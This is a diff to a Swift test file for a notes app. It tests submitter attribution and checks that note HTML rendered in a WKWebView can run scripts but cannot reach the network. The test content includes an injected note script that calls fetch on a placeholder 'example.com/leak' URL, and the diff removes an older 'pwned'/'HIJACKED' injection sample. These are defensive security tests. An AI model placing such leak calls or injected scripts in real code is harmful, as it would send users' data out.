@@ -41,6 +41,34 @@ let noFraction = Note(id: "1", title: "t", folderName: nil, folderColor: nil,
 T.check("displayDate parses a timestamp with no fractional seconds",
         noFraction.displayDate != "2026-09-08T10:13:00Z" && !noFraction.displayDate.isEmpty)
 
+// MARK: - Submitter: the name the top-right chip and the footer show
+
+let fromLaptop = Note(id: "1", title: "t", folderName: nil, folderColor: nil,
+                      updatedAt: nil, createdAt: "2026-09-17T14:32:58Z", type: nil, content: nil, icon: nil,
+                      createdByKey: "GV741W2732", createdByMachine: "GV741W2732")
+T.equal("laptop notes are named by hostname", fromLaptop.submitterName, "GV741W2732")
+let fromBrowser = Note(id: "1", title: "t", folderName: nil, folderColor: nil,
+                       updatedAt: nil, createdAt: nil, type: nil, content: nil, icon: nil,
+                       createdByKey: "stickies", createdByMachine: "10.0.0.9")
+T.equal("the owner's own browser is \"me\"", fromBrowser.submitterName, "me")
+T.equal("no attribution at all is still \"me\"", noDates.submitterName, "me")
+let fromApp = Note(id: "1", title: "t", folderName: nil, folderColor: nil,
+                   updatedAt: nil, createdAt: nil, type: nil, content: nil, icon: nil,
+                   createdByKey: "automations-pipeline", createdByMachine: "M4")
+T.equal("an app is named by its key", fromApp.submitterName, "automations-pipeline")
+let fromHub = Note(id: "1", title: "t", folderName: nil, folderColor: nil,
+                   updatedAt: nil, createdAt: nil, type: nil, content: nil, icon: nil,
+                   createdByKey: "M4", createdByMachine: "M4")
+T.check("the hub posting as itself shows the Mac mini, not the Stickies icon",
+        fromHub.submitterIconURLs.first?.path.hasSuffix("/machines/mac-mini-front.png") == true)
+T.check("an app on the hub keeps its own icon first",
+        fromApp.submitterIconURLs.first?.path.hasSuffix("/app-icons/automations-pipeline.png") == true)
+T.check("and falls back to the Mac mini, not Stickies, when that icon is missing",
+        fromApp.submitterIconURLs.last?.path.hasSuffix("/machines/mac-mini-front.png") == true)
+T.check("createdStamp carries a day and a time", fromLaptop.createdStamp.contains("\u{00B7}"))
+T.check("createdAgo reads as relative", (fromLaptop.createdAgo ?? "").contains("ago"))
+T.equal("createdAgo is nil without a timestamp", noDates.createdAgo, nil)
+
 // MARK: - Folder colour parsing
 
 func coloured(_ hex: String?) -> Note {
@@ -105,11 +133,12 @@ T.equal("an unknown token falls back", NoteIcon.symbol(for: "__hero:NotARealIcon
 T.equal("a nil token falls back", NoteIcon.symbol(for: nil), "doc.text.fill")
 T.equal("a non-prefixed token falls back", NoteIcon.symbol(for: "plain"), "doc.text.fill")
 
-// MARK: - Renderer: CSP must block note scripts, the highlighter must still run
+// MARK: - Renderer: a note may draw, but it may not phone home
 //
-// This is the test that matters most. The find highlighter runs in an isolated
-// content world so a CSP can block every script a note carries. If either half
-// breaks - CSP too weak, or the isolated world blocked too - this catches it.
+// The line the app promises: note scripts RUN (reports chart with Chart.js and an
+// inline script, and blocking them left empty boxes), but the network is shut -
+// fetch, XHR and WebSocket all fail. The find highlighter runs in an isolated
+// content world, which no CSP applies to, and must keep working either way.
 
 final class RenderProbe: NSObject, WKNavigationDelegate {
     let web: WKWebView
@@ -133,10 +162,14 @@ final class RenderProbe: NSObject, WKNavigationDelegate {
         }
     }
 
-    func eval(_ js: String) -> Any? {
+    /// `.defaultClient` for anything the highlighter owns, `.page` for what a
+    /// note's OWN script did. They are separate worlds: a page global read from
+    /// the client world is always undefined, so a check written that way passes
+    /// whether the script ran or not.
+    func eval(_ js: String, in world: WKContentWorld = .defaultClient) -> Any? {
         var out: Any?
         var finished = false
-        web.evaluateJavaScript(js, in: nil, in: .defaultClient) { result in
+        web.evaluateJavaScript(js, in: nil, in: world) { result in
             out = try? result.get()
             finished = true
         }
@@ -153,13 +186,18 @@ final class RenderProbe: NSObject, WKNavigationDelegate {
 let noteBody = """
 <p>The spam fix shipped. Spam was the symptom, not the cause.</p>
 <p>More about spam handling here.</p>
-<script>window.__pwned = true; document.body.innerHTML = 'HIJACKED';</script>
-<div onclick="window.__pwned = true">click me</div>
+<script>
+  window.__ran = true;
+  window.__fetchFailed = "pending";
+  try {
+    fetch("https://example.com/leak").then(function(){ window.__fetchFailed = "allowed"; },
+                                           function(){ window.__fetchFailed = "blocked"; });
+  } catch (e) { window.__fetchFailed = "blocked"; }
+</script>
 """
 let doc = """
 <!doctype html><html><head><meta charset="utf-8">
-<meta http-equiv="Content-Security-Policy"
-      content="default-src 'none'; img-src data: https: http:; style-src 'unsafe-inline'; font-src data:">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net; style-src 'unsafe-inline'; img-src data: https: http:; font-src data: https:; connect-src 'none'; form-action 'none'; base-uri 'none'; object-src 'none'">
 </head><body>\(noteBody)</body></html>
 """
 
@@ -167,20 +205,19 @@ let probe = RenderProbe()
 probe.run(doc)
 T.check("the document finished loading", probe.done)
 
-let pwned = probe.eval("String(window.__pwned)") as? String
-T.check("CSP blocked the note's inline script", pwned == "undefined", "window.__pwned = \(pwned ?? "nil")")
+// The whole point of the change: a note's own script is allowed to draw.
+let ran = probe.eval("String(window.__ran)", in: .page) as? String
+T.equal("the note's inline script runs", ran ?? "nil", "true")
 
-let bodyText = probe.eval("document.body.innerText.indexOf('HIJACKED')") as? Int
-T.equal("the note script did not rewrite the document", bodyText ?? -1, -1)
-
-let strippedDoc = doc.replacingOccurrences(of: noteBody, with: HTMLView.stripScripts(noteBody))
-let stripProbe = RenderProbe()
-stripProbe.run(strippedDoc)
-let lingering = stripProbe.eval("document.body.textContent.indexOf('HIJACKED')") as? Int
-T.equal("stripping removes the script source from the DOM entirely", lingering ?? 0, -1)
-let handler = stripProbe.eval("document.querySelector('div').getAttribute('onclick')")
-T.check("stripping removes inline event handlers", handler is NSNull || handler == nil,
-        "onclick = \(String(describing: handler))")
+// And the half that must NOT move: no network out of a note.
+var verdict = probe.eval("String(window.__fetchFailed)", in: .page) as? String
+var waited = 0
+while verdict == "pending" && waited < 40 {
+    RunLoop.current.run(mode: .default, before: Date().addingTimeInterval(0.05))
+    verdict = probe.eval("String(window.__fetchFailed)", in: .page) as? String
+    waited += 1
+}
+T.equal("connect-src none blocks a note's fetch", verdict ?? "nil", "blocked")
 
 let hits = probe.eval("window.__snFind(\"spam\")") as? Int
 T.equal("the highlighter runs despite the CSP and finds every match", hits ?? -1, 3)
